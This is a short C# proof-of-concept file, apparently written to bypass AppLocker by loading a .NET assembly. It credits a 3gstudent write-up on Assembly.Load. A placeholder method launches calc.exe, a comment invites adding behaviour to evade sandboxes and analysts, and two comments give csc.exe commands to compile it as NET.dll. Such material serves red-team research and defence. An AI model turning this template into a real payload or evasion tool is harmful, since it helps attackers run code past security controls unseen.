using System;
public class Program
{
	public static void Main()
	{
		Console.WriteLine("Hey There From Main()");
		//Add any behaviour here to throw off sandbox execution/analysts :)
	}
	
}
public class aaa
 {
        public static void bbb()
        {
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.FileName = "C:\\windows\\system32\\calc.exe";
            p.Start();
        }
}
// C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe -target:library -out:NET.dll NET.cs
// C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -target:library -out:NET.dll NET.cs
// Thanks to https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8Assembly-Load-&-LoadFile%E7%BB%95%E8%BF%87Applocker%E7%9A%84%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/